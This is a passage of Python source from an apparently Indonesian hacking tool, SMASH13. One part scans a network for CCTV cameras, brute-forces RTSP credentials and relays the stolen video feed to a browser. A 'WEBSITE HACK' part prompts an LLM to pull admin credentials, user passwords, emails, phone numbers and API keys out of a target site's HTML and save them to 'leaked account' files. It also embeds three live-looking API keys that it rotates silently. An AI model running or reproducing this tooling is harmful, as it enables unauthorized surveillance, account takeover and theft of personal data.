    has_mtx    = mediamtx_available()
    if has_ffmpeg:
        print(f"{G}[+] ffmpeg tersedia — RTSP bridge aktif{N}")
    else:
        print(f"{Y}[!] ffmpeg tidak ada. Install: pkg install ffmpeg{N}")
        print(f"{Y}    Tanpa ffmpeg, hanya HTTP stream yang dicoba.{N}")
    if has_mtx:
        print(f"{G}[+] mediamtx tersedia — HLS fallback aktif{N}")

    gw = input(f"\n{G}IP Gateway (Enter = 192.168.1.1): {N}").strip() or "192.168.1.1"
    cameras = scan_cctv_jaringan(gw)
    if not cameras:
        print(f"\n{R}[!] Tidak ada CCTV ditemukan.{N}")
        input(f"{C}Enter untuk kembali...{N}"); return

    tampilkan_cctv(cameras)
    try:
        n = int(input(f"\n{B}Pilih CCTV (1-{len(cameras)}): {N}"))
        if not (1 <= n <= len(cameras)): return
    except: return

    cam = cameras[n-1]
    print(f"\n{G}[+] Target : {B}{cam['ip']}:{cam['port']}{N}")
    print(f"{G}[+] Ports  : {Y}{', '.join(str(p) for p in cam['open_ports'])}{N}")

    # ── tanya password manual (opsional) ──
    print(f"\n{C}Password kamera (kosongkan = bruteforce otomatis):{N}")
    manual_pass = input(f"{C}Password: {N}").strip()
    manual_user = "admin"
    if manual_pass:
        print(f"{G}[+] Pakai credentials: admin:{manual_pass}{N}")

    rtsp_url   = None
    stream_mode = "http"
    hls_port    = 8888

    # ── coba RTSP dulu kalau ffmpeg ada ──
    if has_ffmpeg and cam["has_rtsp"]:
        rtsp_port = cam["rtsp_port"]
        print(f"\n{C}[*] Coba RTSP di port {rtsp_port}...{N}")

        if manual_pass:
            # Coba manual cred dulu — path semua dicoba
            for path in RTSP_PATHS[:8]:
                url = f"rtsp://{manual_user}:{manual_pass}@{cam['ip']}:{rtsp_port}{path}"
                print(f"\r{C}[*] Coba {url[:60]}{N}",end="",flush=True)
                if try_rtsp_url(url, timeout=4):
                    rtsp_url = url; break
            print()

        if not rtsp_url:
            rtsp_url = bruteforce_rtsp(cam["ip"], rtsp_port)

        if rtsp_url:
            print(f"\n{G}[+] RTSP work: {rtsp_url}{N}")
            # Pilih mode: ffmpeg bridge atau mediamtx HLS
            print(f"\n{C}[1]{N} ffmpeg → MJPEG (langsung di browser, no plugin)")
            print(f"{C}[2]{N} mediamtx → HLS  (lebih stabil, butuh mediamtx)")
            mode_choice = input(f"\n{B}Mode (1): {N}").strip() or "1"

            if mode_choice == "2" and has_mtx:
                print(f"\n{G}[*] Start mediamtx relay...{N}")
                if start_mediamtx(rtsp_url, hls_port):
                    stream_mode = "hls"
                    print(f"{G}[+] mediamtx aktif di port {hls_port}{N}")
                else:
                    print(f"{R}[!] mediamtx gagal, fallback ke ffmpeg{N}")
                    stream_mode = "ffmpeg"
            else:
                stream_mode = "ffmpeg"

            if stream_mode == "ffmpeg":
                print(f"\n{G}[*] Start ffmpeg MJPEG bridge...{N}")
                proc = start_ffmpeg_bridge(rtsp_url)
                if not proc:
                    print(f"{R}[!] ffmpeg gagal start. Fallback HTTP.{N}")
                    stream_mode = "http"; rtsp_url = None
                else:
                    time.sleep(1.5)
                    with _MJPEG_LOCK:
                        ok = len(_MJPEG_FRAME) > 0
                    if ok:
                        print(f"{G}[+] Frame pertama diterima — stream aktif.{N}")
                    else:
                        print(f"{Y}[!] Belum ada frame, lanjut tetap (mungkin butuh waktu)...{N}")
        else:
            print(f"\n{Y}[!] RTSP tidak berhasil. Fallback HTTP stream.{N}")
            stream_mode = "http"

    elif has_ffmpeg and not cam["has_rtsp"]:
        # Coba RTSP di port 554 walaupun tidak terdetect terbuka
        print(f"\n{Y}[!] Port RTSP tidak terdetect, coba anyway...{N}")
        rtsp_url = bruteforce_rtsp(cam["ip"], 554)
        if rtsp_url:
            stream_mode = "ffmpeg"
            start_ffmpeg_bridge(rtsp_url)
            time.sleep(1.5)
        else:
            stream_mode = "http"

    # ── tanya URL server lokal ──
    srv_input = input(f"\n{C}URL server lokal (Enter = http://127.0.0.1:8765): {N}").strip()
    srv_port  = 8765
    if srv_input:
        parsed   = urlparse(srv_input if "://" in srv_input else "http://"+srv_input)
        srv_port = parsed.port or 8765
    srv_url = f"http://127.0.0.1:{srv_port}"

    cam_cfg = {
        "ip":       cam["ip"],
        "port":     cam["port"],
        "path":     "AUTO",
        "rtsp_url": rtsp_url,
        "mode":     stream_mode,
        "hls_port": hls_port,
    }

    print(f"\n{G}[*] Start proxy server di {srv_url}...{N}")
    server = start_proxy_server(cam_cfg, srv_port)

    mode_label = {"ffmpeg": "ffmpeg MJPEG bridge", "hls": "HLS via mediamtx", "http": "HTTP direct"}.get(stream_mode, stream_mode)
    print(f"""
{G}{BOX_TOP}{N}
{box_header('SERVER AKTIF')}
{G}{BOX_BOT}{N}

  {W}Buka browser:{N}          {Y}➜  {srv_url}{N}

  Mode    : {C}{mode_label}{N}
  Stream  : {C}{srv_url}/stream{N}
  Snap    : {C}{srv_url}/snapshot{N}
  RTSP    : {C}{rtsp_url or 'N/A'}{N}

  {R}Ctrl+C untuk berhenti.{N}
""")

    try:
        while True: time.sleep(2)
    except KeyboardInterrupt:
        stop_ffmpeg_bridge()
        stop_mediamtx()
        server.shutdown()
        print(f"\n{G}[+] Semua dihentikan.{N}")

# ─── WEBSITE HACK ────────────────────────────────────────────────────────────

DB_EXTS = {".sql", ".db", ".sqlite", ".sqlite3", ".mdb", ".bak", ".log",
           ".env", ".config", ".conf", ".ini", ".xml", ".json", ".yaml",
           ".yml", ".php", ".asp", ".aspx", ".jsp", ".py", ".rb", ".pl",
           ".htaccess", ".htpasswd", ".pem", ".key", ".crt", ".cer",
           ".pfx", ".p12", ".der", ".csr", ".pub", ".priv",
           ".inc", ".class", ".jar", ".war", ".tar", ".gz", ".7z",
           ".zip", ".rar", ".dump", ".dmp", ".export", ".csv"}

ASSET_EXTS = {".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg",
              ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webp",
              ".mp3", ".ogg", ".wav", ".pdf", ".mp4", ".avi", ".mkv",
              ".mov", ".flv", ".webm"}

# ── GROQ AI CONFIG ─────────────────────────────────────────────────────────────
GROQ_MODEL     = "cohere/north-mini-code:free"
GROQ_ENDPOINT  = "https://openrouter.ai/api/v1/chat/completions"
_AI_KEYS       = [
    "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",
    "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",
    "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",
]
GROQ_API_KEY   = _AI_KEYS[0]  # alias untuk cek awal

# ── System Prompt Pass 1: Scan baris per baris HTML utama ─────────────────────
GROQ_SYSTEM_SCAN_MAIN = """Kamu adalah analis keamanan web. Kamu menerima source code HTML halaman utama sebuah website.

TUGASMU: Baca SETIAP BARIS source code secara rinci dan ekstrak semua informasi berikut:

1. TEKNOLOGI BACKEND — framework, bahasa server, CMS, versi
2. DATABASE — jenis database (MySQL/PostgreSQL/MongoDB/SQLite/dll), nama tabel, nama kolom, ORM yang dipakai
3. KREDENSIAL ADMIN — username/password admin yang hardcoded di HTML, JS, komentar, atribut value, hidden field, atau variabel JS
4. DATA PENGGUNA BOCOR — username, password, email, nomor telepon, nama lengkap, data pribadi pengguna lain yang muncul di source HTML (misalnya di tabel, list, JSON inline, response API yang di-render langsung)
5. ENDPOINT LOGIN ADMIN — URL form login admin, panel admin, dashboard
6. API KEY / TOKEN — semua key, token, secret yang hardcoded
7. ENDPOINT — semua route API, URL admin, endpoint tersembunyi
8. ASET — path file CSS, JS, gambar, font
9. FILE HTML LAIN — link ke halaman lain dalam domain yang sama
10. KONFIGURASI — environment variable, connection string, DSN
11. CELAH — debug mode aktif, error message bocor info, IDOR, data exposure

Untuk setiap temuan, catat nomor baris asalnya jika memungkinkan.

Output HANYA JSON ketat, tanpa penjelasan, tanpa markdown:
{
  "teknologi": {"framework":"...","bahasa":"...","cms":"...","versi":"..."},
  "database": {
    "jenis": "mysql|postgres|sqlite|mongo|redis|...|tidak_diketahui",
    "nama_tabel": ["tabel1","tabel2"],
    "nama_kolom": ["kolom1","kolom2"],
    "orm": "eloquent|sequelize|django|...|tidak_ada",
    "trigger_ditemukan": true
  },
  "kredensial": [{"user":"...","pass":"...","host":"...","db":"...","baris":"...","keterangan":"..."}],
  "bocor_akun_admin": [{"username":"...","password":"...","endpoint_login":"...","baris":"...","keterangan":"..."}],
  "bocor_pengguna": [{"nama":"...","username":"...","password":"...","email":"...","telepon":"...","data_lain":"...","baris":"..."}],
  "api_key": [{"key":"...","layanan":"...","baris":"..."}],
  "endpoint": [{"url":"...","metode":"GET|POST","keterangan":"..."}],
  "aset": {"css":["..."],"js":["..."],"gambar":["..."],"font":["..."],"lainnya":["..."]},
  "halaman_html": ["url-halaman-lain-1","url-halaman-lain-2"],
  "konfigurasi": ["..."],
  "celah": ["..."],
  "ringkasan_baris": ["baris N: temuan penting..."]
}"""

# ── System Prompt Pass 2: Generate semua file output ──────────────────────────
GROQ_SYSTEM_GENERATE_FILES = """Kamu adalah engineer yang membuat file output dari hasil analisis keamanan web.

Kamu menerima JSON hasil scan halaman utama sebuah website. Tugasmu adalah membuat SEMUA file output berikut dalam Bahasa Indonesia:

1. FILE DATABASE (jika database.trigger_ditemukan = true):
   - schema.sql — CREATE TABLE lengkap berdasarkan tabel/kolom yang ditemukan, plus INSERT contoh
   - query_umum.sql — SELECT, INSERT, UPDATE, DELETE untuk tiap tabel yang ditemukan
   - koneksi.txt — kode koneksi database dalam PHP, Python, dan Node.js

2. FILE KONFIGURASI:
   - .env.temuan — semua kredensial dan API key yang ditemukan dalam format .env
   - config_rekonstruksi.php — file konfigurasi PHP yang direkonstruksi dari temuan

3. FILE KREDENSIAL BOCOR (jika bocor_akun_admin atau bocor_pengguna tidak kosong):
   - akun_admin_bocor.txt — tiap baris: URL_LOGIN | USERNAME | PASSWORD | keterangan
     Format contoh:
     https://target.com/admin/login | admin | p@ssw0rd | ditemukan di baris 42, hidden field
   - data_pengguna_bocor.txt — tiap baris: NAMA | USERNAME | PASSWORD | EMAIL | TELEPON | data_lain
     Urutkan dari yang paling banyak datanya. Sertakan catatan baris sumber.

4. FILE ASET:
   - daftar_aset.txt — semua CSS, JS, gambar, font terorganisir per kategori

5. FILE HTML:
   - daftar_halaman.txt — semua halaman HTML yang ditemukan/direferensi beserta fungsinya

6. LAPORAN:
   - laporan_ai.txt — laporan lengkap Bahasa Indonesia: temuan kritis, kredensial bocor, celah, rekomendasi

Output HANYA JSON ketat:
{
  "schema_sql": "-- kode SQL lengkap...",
  "query_umum_sql": "-- SELECT * FROM ...",
  "koneksi_txt": "=== PHP ===\\n<?php ...\\n=== Python ===\\nimport ...",
  "env_temuan": "DB_HOST=...\\nDB_USER=...",
  "config_php": "<?php ...?>",
  "akun_admin_bocor_txt": "URL_LOGIN | USERNAME | PASSWORD | KETERANGAN\\n...",
  "data_pengguna_bocor_txt": "NAMA | USERNAME | PASSWORD | EMAIL | TELEPON | DATA_LAIN\\n...",
  "daftar_aset_txt": "=== CSS ===\\n...\\n=== JS ===\\n...",
  "daftar_halaman_txt": "1. /index.html — halaman utama\\n2. ...",
  "laporan_ai_txt": "=== LAPORAN KEAMANAN AI ===\\nTarget: ...\\n..."
}"""


def _groq_call(system_prompt, user_content, label="AI", pass2=False):
    """
    Coba tiap API key secara urut, diam-diam.
    Error tidak ditampilkan ke pengguna — langsung ganti key dan ulangi.
    Kalau semua key gagal, return (None, error) tanpa print apapun.
    """
    last_err = "semua key gagal"
    for key in _AI_KEYS:
        try:
            payload = json.dumps({
                "model":       GROQ_MODEL,
                "messages":    [
                    {"role": "system", "content": system_prompt},
                    {"role": "user",   "content": user_content},
                ],
                "temperature": 0.1,
                "max_tokens":  8192,
            }).encode("utf-8")

            headers = {
                "Content-Type":    "application/json",
                "Authorization":   f"Bearer {key}",
                "HTTP-Referer":    "https://smash.local",
                "X-Title":         "SMASH",
                "User-Agent":      "python-requests/2.31.0",
                "Accept":          "application/json",
                "Accept-Encoding": "gzip, deflate",
                "Connection":      "keep-alive",
            }
            req = urllib.request.Request(
                GROQ_ENDPOINT, data=payload, headers=headers, method="POST"
            )
            with urllib.request.urlopen(req, timeout=120) as resp:
                raw = resp.read()
                enc = resp.headers.get("Content-Encoding", "")
                if enc == "gzip":
                    import gzip; raw = gzip.decompress(raw)
                elif enc == "deflate":
                    import zlib; raw = zlib.decompress(raw)
                body = json.loads(raw.decode("utf-8"))
            content = body["choices"][0]["message"]["content"].strip()
            content = re.sub(r"^```(?:json)?\s*", "", content)
            content = re.sub(r"\s*```$",           "", content)
            return content, None   # berhasil — langsung return
        except urllib.error.HTTPError as e:
            try:
                import gzip as _gz
                err_raw = e.read()
                enc = e.headers.get("Content-Encoding", "")
                if enc == "gzip":
                    err_raw = _gz.decompress(err_raw)
                elif enc == "deflate":
                    import zlib as _zl; err_raw = _zl.decompress(err_raw)
                last_err = f"HTTP {e.code}"
            except Exception:
                last_err = f"HTTP {e.code}"
            # Diam-diam lanjut ke key berikutnya
        except Exception as ex:
            last_err = str(ex)
            # Diam-diam lanjut ke key berikutnya

    return None, last_err


def _sistem_susun_output(html_source, out_dir, base_url):
    """
    Fallback kalau semua API key AI gagal.
    Sistem sendiri parsing HTML dan menyusun file output tanpa AI.
    """
    db_dir    = os.path.join(out_dir, "database")
    aset_dir  = os.path.join(out_dir, "assets")
    html_dir  = os.path.join(out_dir, "html")
    recon_dir = os.path.join(out_dir, "recon")
    for d in (db_dir, aset_dir, html_dir, recon_dir):
        os.makedirs(d, exist_ok=True)

    dibuat = []

    # ── Ekstrak link, endpoint, kredensial kasar dari HTML ────────────────────
    links      = re.findall(r'href=["\']([^"\'>\s]+)["\']', html_source, re.I)
    srcs       = re.findall(r'src=["\']([^"\'>\s]+)["\']',  html_source, re.I)
    forms      = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', html_source, re.I)
    inputs     = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html_source, re.I)
    comments   = re.findall(r'<!--(.*?)-->', html_source, re.DOTALL)
    js_strings = re.findall(r'(?:password|passwd|pwd|secret|token|api[_-]?key|apikey)\s*[=:]\s*["\']([^"\']{3,})["\']', html_source, re.I)
    db_hints   = re.findall(r'(?:mysql|postgres|sqlite|mongo|redis|db_host|database_url|dsn)[^"\']*["\']([^"\']+)["\']', html_source, re.I)
    emails     = list(set(re.findall(r'[\w.+-]+@[\w.-]+\.\w+', html_source)))
    phones     = list(set(re.findall(r'(?:\+62|08)\d{8,12}', html_source)))

    # ── Daftar halaman ────────────────────────────────────────────────────────
    all_links = sorted(set(
        urllib.parse.urljoin(base_url, l) for l in links
        if not l.startswith(("data:", "javascript:", "#", "mailto:"))
    ))
    hal_path = os.path.join(html_dir, "daftar_halaman.txt")
    with open(hal_path, "w", encoding="utf-8") as f:
        f.write(f"=== DAFTAR HALAMAN — {base_url} ===\n")
        f.write(f"Dibuat sistem (AI tidak tersedia)\n\n")
        for i, u in enumerate(all_links, 1):
            f.write(f"{i}. {u}\n")
    dibuat.append(hal_path)

    # ── Daftar aset ───────────────────────────────────────────────────────────
    css_list = [s for s in srcs + links if s.lower().endswith(".css")]
    js_list  = [s for s in srcs if s.lower().endswith(".js")]
    img_list = [s for s in srcs if re.search(r'\.(png|jpg|jpeg|gif|webp|svg|ico)$', s, re.I)]
    aset_path = os.path.join(aset_dir, "daftar_aset.txt")
    with open(aset_path, "w", encoding="utf-8") as f:
        f.write(f"=== DAFTAR ASET — {base_url} ===\n\n")
        f.write(f"=== CSS ({len(css_list)}) ===\n")
        for s in css_list: f.write(f"  {s}\n")
        f.write(f"\n=== JS ({len(js_list)}) ===\n")
        for s in js_list:  f.write(f"  {s}\n")
        f.write(f"\n=== Gambar ({len(img_list)}) ===\n")
        for s in img_list: f.write(f"  {s}\n")
    dibuat.append(aset_path)

    # ── .env dari temuan kasar ────────────────────────────────────────────────
    if js_strings or db_hints:
        env_path = os.path.join(db_dir, ".env.temuan")
        with open(env_path, "w", encoding="utf-8") as f:
            f.write(f"# Temuan sistem (tanpa AI) — {base_url}\n\n")
            for s in js_strings:
                f.write(f"TEMUAN_CREDENTIAL={s}\n")
            for s in db_hints:
                f.write(f"TEMUAN_DB={s}\n")
        dibuat.append(env_path)

    # ── Laporan sistem ────────────────────────────────────────────────────────
    lap_path = os.path.join(recon_dir, "laporan_sistem.txt")
    with open(lap_path, "w", encoding="utf-8") as f:
        f.write(f"=== LAPORAN SISTEM (AI tidak tersedia) ===\n")
        f.write(f"Target  : {base_url}\n")
        f.write(f"Waktu   : {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(f"Link ditemukan     : {len(all_links)}\n")
        f.write(f"Form action        : {len(forms)}\n")
        f.write(f"Input field        : {len(inputs)}\n")
        f.write(f"Email bocor        : {len(emails)}\n")
        f.write(f"Telepon bocor      : {len(phones)}\n")
        f.write(f"Kredensial kasar   : {len(js_strings)}\n")
        f.write(f"Hint database      : {len(db_hints)}\n\n")
        if emails:
            f.write(f"=== EMAIL ===\n")
            for e in emails: f.write(f"  {e}\n")
        if phones:
            f.write(f"\n=== TELEPON ===\n")
            for p in phones: f.write(f"  {p}\n")
        if js_strings:
            f.write(f"\n=== KREDENSIAL KASAR ===\n")
            for s in js_strings: f.write(f"  {s}\n")
        if forms:
            f.write(f"\n=== FORM ENDPOINT ===\n")
            for fm in forms: f.write(f"  {fm}\n")
        if comments:
            f.write(f"\n=== KOMENTAR HTML ({len(comments)}) ===\n")
            for c in comments[:20]:
                c = c.strip()
                if c: f.write(f"  <!-- {c[:120]} -->\n")
    dibuat.append(lap_path)

    return dibuat


def _tulis_file(path, konten, label):
    """Tulis string ke file, print status."""
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(konten)
        print(f"  {G}[AI] {label} → {os.path.basename(path)}{N}")
        return True
    except Exception as e:
        print(f"  {R}[AI] Gagal tulis {label}: {e}{N}")
        return False


def _ext_dari_content(data, url):
    """Deteksi ekstensi file dari magic bytes atau URL."""
    sigs = [
        (b"\xff\xd8\xff",     ".jpg"),
        (b"\x89PNG\r\n",      ".png"),
        (b"GIF87a",           ".gif"),
        (b"GIF89a",           ".gif"),
        (b"RIFF",             ".webp"),   # webp dalam RIFF container
        (b"\x00\x00\x00\x18ftyp", ".mp4"),
        (b"\x00\x00\x00\x20ftyp", ".mp4"),
        (b"ID3",              ".mp3"),
        (b"\xff\xfb",         ".mp3"),
        (b"OggS",             ".ogg"),
        (b"fLaC",             ".flac"),
        (b"RIFF",             ".wav"),
        (b"BM",               ".bmp"),
        (b"\x00\x00\x01\x00", ".ico"),
        (b"<svg",             ".svg"),
        (b"%PDF",             ".pdf"),
        (b"PK\x03\x04",      ".zip"),
    ]
    for sig, ext in sigs:
        if data[:len(sig)] == sig:
            return ext
    # Fallback ke ekstensi URL
    ext = os.path.splitext(urlparse(url).path.lower())[1]
    return ext if ext else ".bin"


def ai_download_aset(html_source, out_dir, base_url):
    """
    Ekstrak semua link aset dari HTML main, download dan simpan ke assets/
    sesuai tipe konten aslinya (jpg, png, mp4, mp3, dll).
    """
    aset_dir = os.path.join(out_dir, "assets")
    os.makedirs(aset_dir, exist_ok=True)

    # Pola link aset yang umum
    pola = [
        r'src=["\']([^"\'>\s]+)["\']',
        r'href=["\']([^"\'>\s]+\.(css|js|png|jpg|jpeg|gif|svg|webp|ico|mp4|mp3|ogg|wav|flac|woff2?|ttf|eot|pdf|bmp))["\']',
        r'url\(["\']?([^"\')\s]+)["\']?\)',
        r'data-src=["\']([^"\'>\s]+)["\']',
        r'data-url=["\']([^"\'>\s]+)["\']',
        r'content=["\']([^"\'>\s]+\.(png|jpg|jpeg|gif|svg|webp))["\']',
    ]

    links = set()
    for p in pola:
        for m in re.finditer(p, html_source, re.IGNORECASE):
            raw = m.group(1)
            # Resolve relative URL
            try:
                full = urllib.parse.urljoin(base_url, raw)
                pu   = urlparse(full)
                if pu.scheme in ("http", "https"):
                    links.add(full)
            except Exception:
                pass

    if not links:
        return 0

    print(f"  {C}[AI-ASET] {len(links)} link aset ditemukan — download dimulai...{N}")
    dl_ok   = 0
    dl_lock = threading.Lock()

    def _dl(url):
        nonlocal dl_ok
        try:
            data, ctype, _ = _fetch_url(url)
            if not data:
                return
            ext   = _ext_dari_content(data, url)
            fname = re.sub(r"[^\w\-\.]", "_", os.path.basename(urlparse(url).path)) or "file"
            if not fname.lower().endswith(ext):
                fname = fname + ext
            dest  = os.path.join(aset_dir, fname)
            # Hindari tumpang tindih nama
            if os.path.exists(dest):
                base, e = os.path.splitext(dest)
                dest = f"{base}_{dl_ok}{e}"
            with open(dest, "wb") as f:
                f.write(data)
            with dl_lock:
                dl_ok += 1
                print(f"  {G}✓ ASET   {N} {os.path.basename(dest)} ({len(data)//1024}KB)")
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=30) as px:
        list(px.map(_dl, links))

    print(f"  {G}[AI-ASET] {dl_ok}/{len(links)} aset berhasil didownload{N}")
    return dl_ok


def ai_scan_dan_generate(main_html_source, out_dir, base_url):
    """
    Sistem AI baru:
    Pass 1 — Baca file HTML [MAIN] baris per baris, ekstrak semua temuan.
    Pass 2 — Generate file database, aset, html list, config, laporan.
    Semua output dalam Bahasa Indonesia.
    Return list path file yang berhasil dibuat.
    """
    db_dir    = os.path.join(out_dir, "database")
    aset_dir  = os.path.join(out_dir, "assets")
    html_dir  = os.path.join(out_dir, "html")
    recon_dir = os.path.join(out_dir, "recon")
    for d in (db_dir, aset_dir, html_dir, recon_dir):
        os.makedirs(d, exist_ok=True)

    dibuat = []

    if not main_html_source:
        print(f"  {Y}[AI] Tidak ada HTML utama untuk dianalisis.{N}")
        return dibuat

    # Potong kalau terlalu panjang — Groq 70B punya 128k ctx, tapi kita batasi 24k char (~6k token)
    source_dikirim = main_html_source
    if len(source_dikirim) > 24000:
        source_dikirim = source_dikirim[:24000] + "\n\n[...sumber dipotong di karakter ke-24000...]"

    total_baris = len(source_dikirim.splitlines())
    print(f"  {C}[AI] Pass 1 — Membaca {total_baris} baris HTML utama...{N}")

    scan_raw, err1 = _groq_call(
        GROQ_SYSTEM_SCAN_MAIN,
        f"Target: {base_url}\n\nSOURCE CODE HTML HALAMAN UTAMA:\n{source_dikirim}"
    )

    if err1:
        # Semua key gagal — sistem susun sendiri tanpa AI, diam-diam
        fallback = _sistem_susun_output(main_html_source, out_dir, base_url)
        dibuat.extend(fallback)
        return dibuat

    # Simpan hasil scan mentah
    scan_path = os.path.join(recon_dir, "ai_scan_raw.json")
    _tulis_file(scan_path, scan_raw, "scan mentah")
    dibuat.append(scan_path)

    # Parse hasil scan
    try:
        scan_obj = json.loads(scan_raw)
    except Exception:
        scan_obj = {}
        print(f"  {Y}[AI] Hasil scan bukan JSON valid — lanjut ke Pass 2 dengan raw string.{N}")

    # Ringkas temuan ke terminal
    db_info         = scan_obj.get("database", {})
    kredensial      = scan_obj.get("kredensial", [])
    bocor_admin     = scan_obj.get("bocor_akun_admin", [])
    bocor_pengguna  = scan_obj.get("bocor_pengguna", [])
    api_keys        = scan_obj.get("api_key", [])
    endpoints       = scan_obj.get("endpoint", [])
    celah           = scan_obj.get("celah", [])
    db_trigger      = db_info.get("trigger_ditemukan", False) or bool(db_info.get("jenis") and db_info.get("jenis") != "tidak_diketahui")

    print(f"  {G}[AI] Pass 1 selesai:{N}")
    print(f"       Database trigger   : {G if db_trigger else Y}{'YA' if db_trigger else 'Tidak'}{N}")
    print(f"       Kredensial server  : {len(kredensial)}")
    print(f"       Akun admin bocor   : {R if bocor_admin else N}{len(bocor_admin)}{N}")
    print(f"       Data pengguna bocor: {R if bocor_pengguna else N}{len(bocor_pengguna)}{N}")
    print(f"       API key            : {len(api_keys)}")
    print(f"       Endpoint           : {len(endpoints)}")
    print(f"       Celah ditemukan    : {len(celah)}")

    # ── Download aset dari link di HTML main ──────────────────────────────────
    print(f"  {C}[AI] Download aset dari link HTML main...{N}")
    ai_download_aset(main_html_source, out_dir, base_url)

    # ── Pass 2: Generate semua file ───────────────────────────────────────────
    scan_trimmed = scan_raw[:6000] if len(scan_raw) > 6000 else scan_raw
    print(f"\n  {M}[AI] Pass 2 — Membuat file output...{N}")

    gen_raw, err2 = _groq_call(
        GROQ_SYSTEM_GENERATE_FILES,
        f"Target: {base_url}\n\nHASIL SCAN:\n{scan_trimmed}"
    )

    if err2:
        print(f"  {R}[AI] Pass 2 gagal: {err2}{N}")
        _tulis_file(
            os.path.join(recon_dir, "ai_pass2_error.txt"),
            f"Pass 2 error: {err2}\n",
            "log error pass 2"
        )
        return dibuat

    # Parse output generator
    try:
        gen_obj = json.loads(gen_raw)
    except Exception:
        gen_obj = {}
        print(f"  {Y}[AI] Output generator bukan JSON valid.{N}")
        _tulis_file(
            os.path.join(recon_dir, "ai_generate_raw.txt"),
            gen_raw,
            "output generator raw"
        )
        dibuat.append(os.path.join(recon_dir, "ai_generate_raw.txt"))
        return dibuat

    # ── Tulis file database (hanya kalau trigger ditemukan) ───────────────────
    if db_trigger:
        print(f"  {M}[AI] Database terdeteksi — membuat file schema & query...{N}")

        schema = gen_obj.get("schema_sql", "").strip()
        if schema:
            p = os.path.join(db_dir, "schema.sql")
            header  = f"-- Rekonstruksi schema AI untuk {base_url}\n"
            header += f"-- Dibuat otomatis oleh SMASH13 AI Scanner\n"
            header += f"-- Waktu: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            _tulis_file(p, header + schema, "schema.sql")
            dibuat.append(p)

        query = gen_obj.get("query_umum_sql", "").strip()
        if query:
            p = os.path.join(db_dir, "query_umum.sql")
            header  = f"-- Query umum untuk {base_url}\n"
            header += f"-- Dibuat otomatis oleh SMASH13 AI Scanner\n\n"
            _tulis_file(p, header + query, "query_umum.sql")
            dibuat.append(p)

        koneksi = gen_obj.get("koneksi_txt", "").strip()
        if koneksi:
            p = os.path.join(db_dir, "koneksi.txt")
            _tulis_file(p, f"=== KODE KONEKSI DATABASE ===\nTarget: {base_url}\n\n" + koneksi, "koneksi.txt")
            dibuat.append(p)
    else:
        print(f"  {Y}[AI] Tidak ada trigger database — file schema dilewati.{N}")

    # ── Tulis file konfigurasi ────────────────────────────────────────────────
    env_content = gen_obj.get("env_temuan", "").strip()
    if env_content:
        p = os.path.join(db_dir, ".env.temuan")
        header  = f"# Kredensial yang ditemukan AI untuk {base_url}\n"
        header += f"# Dibuat oleh SMASH13 AI Scanner\n\n"
        _tulis_file(p, header + env_content, ".env.temuan")
        dibuat.append(p)

    config_php = gen_obj.get("config_php", "").strip()
    if config_php:
        p = os.path.join(db_dir, "config_rekonstruksi.php")
        _tulis_file(p, config_php, "config_rekonstruksi.php")
        dibuat.append(p)

    # ── Tulis file kredensial bocor ───────────────────────────────────────────
    admin_bocor = gen_obj.get("akun_admin_bocor_txt", "").strip()
    if admin_bocor:
        p = os.path.join(recon_dir, "akun_admin_bocor.txt")
        header  = f"=== AKUN ADMIN BOCOR — {base_url} ===\n"
        header += f"Dibuat  : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        header += f"Format  : URL_LOGIN | USERNAME | PASSWORD | KETERANGAN\n"
        header += f"{'='*60}\n\n"
        _tulis_file(p, header + admin_bocor, "akun_admin_bocor.txt")
        dibuat.append(p)
        # Print preview ke terminal
        baris_admin = [b for b in admin_bocor.splitlines() if b.strip()]
        print(f"  {R}[!] {len(baris_admin)} akun admin bocor ditemukan!{N}")
        for b in baris_admin[:5]:
            print(f"      {R}{b[:80]}{N}")

    pengguna_bocor = gen_obj.get("data_pengguna_bocor_txt", "").strip()
    if pengguna_bocor:
        p = os.path.join(recon_dir, "data_pengguna_bocor.txt")
        header  = f"=== DATA PENGGUNA BOCOR — {base_url} ===\n"
        header += f"Dibuat  : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        header += f"Format  : NAMA | USERNAME | PASSWORD | EMAIL | TELEPON | DATA_LAIN\n"
        header += f"{'='*60}\n\n"
        _tulis_file(p, header + pengguna_bocor, "data_pengguna_bocor.txt")
        dibuat.append(p)
        baris_user = [b for b in pengguna_bocor.splitlines() if b.strip()]
        print(f"  {R}[!] {len(baris_user)} data pengguna bocor ditemukan!{N}")

    # ── Tulis file aset ───────────────────────────────────────────────────────
    daftar_aset = gen_obj.get("daftar_aset_txt", "").strip()
    if daftar_aset:
        p = os.path.join(aset_dir, "daftar_aset.txt")
        header = f"=== DAFTAR ASET — {base_url} ===\nDibuat: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        _tulis_file(p, header + daftar_aset, "daftar_aset.txt")
        dibuat.append(p)

    # ── Tulis daftar halaman HTML ─────────────────────────────────────────────
    daftar_html = gen_obj.get("daftar_halaman_txt", "").strip()
    if daftar_html:
        p = os.path.join(html_dir, "daftar_halaman.txt")
        header = f"=== DAFTAR HALAMAN HTML — {base_url} ===\nDibuat: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        _tulis_file(p, header + daftar_html, "daftar_halaman.txt")
        dibuat.append(p)

    # ── Tulis laporan AI ──────────────────────────────────────────────────────
    laporan = gen_obj.get("laporan_ai_txt", "").strip()
    if laporan:
        p = os.path.join(recon_dir, "laporan_ai.txt")
        header  = f"=== LAPORAN KEAMANAN AI — SMASH13 ===\n"
        header += f"Target  : {base_url}\n"
        header += f"Waktu   : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        header += f"{'='*50}\n\n"
        _tulis_file(p, header + laporan, "laporan_ai.txt")
        dibuat.append(p)

    # Simpan raw generate JSON juga untuk debugging
    p = os.path.join(recon_dir, "ai_generate_raw.json")
    _tulis_file(p, gen_raw, "generate raw JSON")
    dibuat.append(p)

    return dibuat

# Path sensitif yang langsung dicoba tanpa crawl
SENSITIVE_PATHS = [
    # ── Environment & config ──────────────────────────────────────────────────
